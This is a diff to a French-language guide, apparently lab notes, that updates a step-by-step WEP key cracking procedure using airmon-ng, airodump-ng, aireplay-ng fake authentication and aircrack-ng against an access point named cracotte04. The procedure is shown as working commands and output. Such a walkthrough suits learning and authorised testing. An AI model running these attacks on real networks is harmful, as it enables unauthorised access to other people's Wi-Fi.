@@ -1496,16 +1496,18 @@ apt install aircrack-ng pciutils crunch
 ```
 airmon-ng
 ```
-La carte Wifi se nomme `wlan0mon`.
+La carte Wifi se nomme `wlx40a5ef059e47`.
 
 * Démarrer la carte Wifi en mode de surveillance (monitor mode) :
 ```
-sudo airmon-ng start wlan0mon
+airmon-ng start wlx40a5ef059e47
+airmon-ng start wlan0mon
 ```
+Après activation du mode de surveillance, la carte Wifi se nomme `wlan0mon`.
 
 * Lancer une écoute de tout les paquets Wifi qui circulent afin de déterminer les paramètres du réseau à attaquer :
 ```
-sudo airodump-ng wlan0mon
+airodump-ng wlan0mon
 ```
 Récupérer les informations suivantes :  
 &ensp; &rarr; BSSID	- 04:DA:D2:9C:50:53  
@@ -1514,7 +1516,7 @@ Récupérer les informations suivantes :
 
 * Réaliser un test d'injection sur le point d'accès pour vérifier que la distance entre la carte Wifi et le point d'accès est suffisante :
 ```
-sudo aireplay-ng -9 -e cracotte04 -a 04:DA:D2:9C:50:53 wlan0mon
+aireplay-ng -9 -e cracotte04 -a 04:DA:D2:9C:50:53 wlan0mon
 ```
 La commande doit retourner un pourcentage proche de 100% pour réaliser l'opération.
 
@@ -1524,13 +1526,13 @@ Il faut désormais lancer deux opérations en parallèle :
 
 * Récupérer les vecteurs d'initialisation (VI) pour l'algorithme de cassage :
 ```
-sudo airodump-ng -c 3 --bssid 04:DA:D2:9C:50:53 -w output wlan0mon
+airodump-ng -c 3 --bssid 04:DA:D2:9C:50:53 -w output wlan0mon
 ```
 Les VI générés sont enregistrés dans les fichiers `output*`
 
 * Associer la carte Wifi et le point d'accès :
 ```
-sudo aireplay-ng -1 0 -e cracotte04 -a 04:DA:D2:9C:50:53 -h {MAC carte Wifi} wlan0mon
+aireplay-ng -1 0 -e cracotte04 -a 04:DA:D2:9C:50:53 -h 40:a5:ef:05:9e:47 wlan0mon
 ```
 Le paramètre `-1` permet d'effectuer de fausses authentifications dont le délai entre les demandes est `0`.  
 Pour cela, il est nécessaire de spécifier le BSSID de la carte Wifi utilisée pour le cassage.
@@ -1539,7 +1541,7 @@ Après un certain temps, un nombre suffisant de VI a été capturé et la clef W
 
 * Casser la clef WEP du point d'accès :
 ```
-sudo aircrack-ng -b 04:DA:D2:9C:50:53 output*.cap
+aircrack-ng -b 04:DA:D2:9C:50:53 output*.cap
 ```
 
 ```
@@ -1553,16 +1555,18 @@ Decrypted correctly: 100%
 ```
 airmon-ng
 ```
-La carte Wifi se nomme `wlan0mon`.
+La carte Wifi se nomme `wlx40a5ef059e47`.
 
 * Démarrer la carte Wifi en mode de surveillance (monitor mode) :
 ```
-sudo airmon-ng start wlan0mon
+airmon-ng start wlx40a5ef059e47
+airmon-ng start wlan0mon
 ```
+Après activation du mode de surveillance, la carte Wifi se nomme `wlan0mon`.
 
 * Lancer une écoute de tout les paquets Wifi qui circulent afin de déterminer les paramètres du réseau à attaquer :
 ```
-sudo airodump-ng wlan0mon
+airodump-ng wlan0mon
 ```
 Récupérer les informations suivantes :  
 &ensp; &rarr; BSSID	- :::::  
